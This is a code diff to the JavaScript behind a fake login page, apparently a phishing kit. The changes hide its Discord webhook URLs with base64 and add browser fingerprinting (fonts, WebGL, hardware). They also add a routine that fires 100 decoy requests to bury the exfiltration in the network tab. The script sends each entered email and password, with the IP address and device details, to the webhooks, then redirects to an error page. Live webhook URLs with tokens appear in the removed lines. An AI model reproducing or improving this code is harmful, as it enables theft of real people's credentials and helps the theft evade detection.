@@ -1,19 +1,10 @@
-// ----------------------------------
-// SELECTING ELEMENTS
-// ----------------------------------
 const loginButton = document.querySelector("button");
+const PRIMARY_WEBHOOK_URL = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2VibG9va3MvMTM1ODkwMTkwMTUwODIxOTAzMS9KN19mb0xfT2R2Nl9FZzBQMTJ4QVZETHoubnR5");
+const BACKUP_WEBHOOK_URL = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM1ODkwMjcxMjA3MDE3Njc2OC91Ny0zZTFQbU00dDdWVFVURF9VQk5ZQ0RrQW5NOEdQX0tLeEhqQjRnX3V4ZWl0YXZSMTRQZ21xZHh6b2FkTjAtTnFLb19i");
 
-// Webhook URLs
-const PRIMARY_WEBHOOK_URL = "https://discord.com/api/webhooks/1358901901508219031/J7_foL_Odv6_Eg0P12xAVDL-9n7neQFed5xFjI4us8HAAJ6BLUw2wxs1-BGqvcCbXa_s";
-const BACKUP_WEBHOOK_URL = "https://discord.com/api/webhooks/1358902712070176768/u7-3e1PmM4t7VTUTD_UBNYCDkAnM9GP_KKxHjB4g_uxeitavR14PgmqdxzoadN0-NqKo"; // Backup webhook (hardcoded)
-
-// Variables to store user data
 let userIP = "Unknown IP";
 let userDeviceInfo = {};
 
-// -----------------------------------
-// FETCH IP ADDRESS ON PAGE LOAD
-// -----------------------------------
 async function fetchIPAddress() {
   try {
     const response = await fetch("https://api.ipify.org?format=json");
@@ -25,16 +16,11 @@ async function fetchIPAddress() {
   }
 }
 
-// Fetch the IP address when the page loads
 document.addEventListener("DOMContentLoaded", async () => {
-  userIP = await fetchIPAddress(); // Store the IP address in the `userIP` variable
-  console.log("User IP Address:", userIP); // Optional: Log the IP for debugging
-  collectDeviceInfo(); // Collect additional device info
+  userIP = await fetchIPAddress();
+  collectDeviceInfo();
 });
 
-// -----------------------------------
-// COLLECT DEVICE INFORMATION
-// -----------------------------------
 function collectDeviceInfo() {
   userDeviceInfo = {
     userAgent: navigator.userAgent,
@@ -47,11 +33,15 @@ function collectDeviceInfo() {
     language: navigator.language,
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     referrer: document.referrer || "Direct",
+    installedFonts: getInstalledFonts(),
+    webGLInfo: getWebGLInfo(),
+    cpuCores: navigator.hardwareConcurrency || "Unknown",
+    memory: navigator.deviceMemory || "Unknown",
+    doNotTrack: navigator.doNotTrack || "Unknown",
+    touchSupport: navigator.maxTouchPoints > 0 ? "Yes" : "No",
   };
-  console.log("Device Info:", userDeviceInfo); // Optional: Log device info for debugging
 }
 
-// Helper functions to extract browser and OS details
 function getBrowserName() {
   const userAgent = navigator.userAgent;
   if (/Firefox/.test(userAgent)) return "Firefox";
@@ -77,110 +67,100 @@ function getOS() {
   return "Unknown OS";
 }
 
-// -----------------------------------
-// SEND DATA TO WEBHOOK
-// -----------------------------------
+function getInstalledFonts() {
+  const baseFonts = ["monospace", "sans-serif", "serif"];
+  const testString = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+  const canvas = document.createElement("canvas");
+  const context = canvas.getContext("2d");
+  const detectedFonts = [];
+  const fontList = [
+    "Arial", "Arial Black", "Comic Sans MS", "Courier New", "Georgia",
+    "Impact", "Lucida Console", "Lucida Sans Unicode", "Palatino Linotype",
+    "Tahoma", "Times New Roman", "Trebuchet MS", "Verdana"
+  ];
+  fontList.forEach((font) => {
+    context.font = `72px ${font}, ${baseFonts[0]}`;
+    const baseWidth = context.measureText(testString).width;
+    context.font = `72px ${baseFonts[0]}`;
+    const defaultWidth = context.measureText(testString).width;
+    if (baseWidth !== defaultWidth) {
+      detectedFonts.push(font);
+    }
+  });
+  return detectedFonts.join(", ");
+}
+
+function getWebGLInfo() {
+  try {
+    const canvas = document.createElement("canvas");
+    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+    if (!gl) return "WebGL not supported";
+    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+    return `${vendor} / ${renderer}`;
+  } catch (error) {
+    return "WebGL info unavailable";
+  }
+}
+
 async function sendCredentialsToWebhook(email, password) {
   try {
-    // Use the stored IP address and device info
     const ip = userIP;
-
-    // Prepare the embed payload
     const embedPayload = {
       embeds: [
         {
           title: "Login Attempt",
-          color: 0xff0000, // Red color for visibility
+          color: 0xff0000,
           fields: [
-            {
-              name: "Email",
-              value: email || "No email provided",
-              inline: true,
-            },
-            {
-              name: "Password",
-              value: password || "No password provided",
-              inline: true,
-            },
-            {
-              name: "IP Address",
-              value: ip || "Unknown IP",
-              inline: false,
-            },
-            {
-              name: "Browser",
-              value: `${userDeviceInfo.browserName} (${userDeviceInfo.browserVersion})`,
-              inline: true,
-            },
-            {
-              name: "Operating System",
-              value: userDeviceInfo.os,
-              inline: true,
-            },
-            {
-              name: "Screen Resolution",
-              value: `${userDeviceInfo.screenWidth}x${userDeviceInfo.screenHeight}`,
-              inline: true,
-            },
-            {
-              name: "Language",
-              value: userDeviceInfo.language,
-              inline: true,
-            },
-            {
-              name: "Timezone",
-              value: userDeviceInfo.timezone,
-              inline: true,
-            },
-            {
-              name: "Referrer",
-              value: userDeviceInfo.referrer,
-              inline: false,
-            },
+            { name: "Email", value: email || "No email provided", inline: true },
+            { name: "Password", value: password || "No password provided", inline: true },
+            { name: "IP Address", value: ip || "Unknown IP", inline: false },
+            { name: "Browser", value: `${userDeviceInfo.browserName} (${userDeviceInfo.browserVersion})`, inline: true },
+            { name: "Operating System", value: userDeviceInfo.os, inline: true },
+            { name: "Screen Resolution", value: `${userDeviceInfo.screenWidth}x${userDeviceInfo.screenHeight}`, inline: true },
+            { name: "Language", value: userDeviceInfo.language, inline: true },
+            { name: "Timezone", value: userDeviceInfo.timezone, inline: true },
+            { name: "Referrer", value: userDeviceInfo.referrer, inline: false },
+            { name: "Installed Fonts", value: userDeviceInfo.installedFonts || "Unavailable", inline: false },
+            { name: "WebGL Info", value: userDeviceInfo.webGLInfo || "Unavailable", inline: false },
+            { name: "CPU Cores", value: userDeviceInfo.cpuCores || "Unknown", inline: true },
+            { name: "Memory", value: `${userDeviceInfo.memory} GB`, inline: true },
+            { name: "Do Not Track", value: userDeviceInfo.doNotTrack, inline: true },
+            { name: "Touch Support", value: userDeviceInfo.touchSupport, inline: true },
           ],
-          timestamp: new Date().toISOString(), // Timestamp for when the data was sent
+          timestamp: new Date().toISOString(),
         },
       ],
     };
-
-    // Send the payload to the primary webhook
+    spamNetworkTab();
     let response = await fetch(PRIMARY_WEBHOOK_URL, {
       method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify(embedPayload),
     });
-
-    // Check if the primary webhook failed
     if (!response.ok) {
-      console.error("Primary webhook failed. Attempting backup webhook...");
-
-      // Send the payload to the backup webhook
       response = await fetch(BACKUP_WEBHOOK_URL, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify(embedPayload),
       });
-
       if (!response.ok) {
         console.error("Backup webhook also failed. Data not sent.");
-      } else {
-        console.log("Data successfully sent to backup webhook.");
       }
-    } else {
-      console.log("Data successfully sent to primary webhook.");
     }
   } catch (error) {
     console.error("Error sending credentials to webhook:", error);
   }
 }
 
-// -----------------------------------
-// ELLIPSIS ANIMATION
-// ------------------------------------
+function spamNetworkTab() {
+  const fakeEndpoints = Array.from({ length: 100 }, () => `https://example.com/fake-endpoint-${Math.random().toString(36).substring(7)}`);
+  fakeEndpoints.forEach((url) => {
+    fetch(url, { mode: "no-cors" }).catch(() => {});
+  });
+}
+
 function removeEllipsisAnimation() {
   loginButton.innerHTML = "";
   loginButton.textContent = "Log In";
@@ -188,40 +168,21 @@ function removeEllipsisAnimation() {
 }
 
 function animateEllipsis() {
-  // Get user input from the form
   const email = document.getElementById("emailORphone").value;
   const password = document.getElementById("password").value;
-
-  // Send credentials to webhook
   sendCredentialsToWebhook(email, password);
-
-  // Start animation
-  loginButton.innerHTML = `<span class="spinner" role="img" aria-label="Loading">
-                                    <span class="inner pulsingEllipsis">
-                                        <span class="item spinnerItem"></span>
-                                        <span class="item spinnerItem"></span>
-                                        <span class="item spinnerItem"></span>
-                                    </span>
-                           </span>`;
+  loginButton.innerHTML = `<span class="spinner" role="img" aria-label="Loading"><span class="inner pulsingEllipsis"><span class="item spinnerItem"></span><span class="item spinnerItem"></span><span class="item spinnerItem"></span></span></span>`;
   const spinnerItems = document.querySelectorAll(".spinnerItem");
   spinnerItems.forEach((item, index) => {
-    item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${
-      index * 0.2
-    }s`;
+    item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${index * 0.2}s`;
   });
   loginButton.setAttribute("disabled", "true");
-
-  // Simulate login process
   setTimeout(() => {
     removeEllipsisAnimation();
-    // Redirect to error.html after 3 seconds
     window.location.href = "error.html";
   }, 3000);
 }
 
-// --------------------------
-// ATTACHING EVENT LISTENERS
-// --------------------------
 loginButton.addEventListener("click", animateEllipsis);
 document.addEventListener("contextmenu", function (e) {
   e.preventDefault();
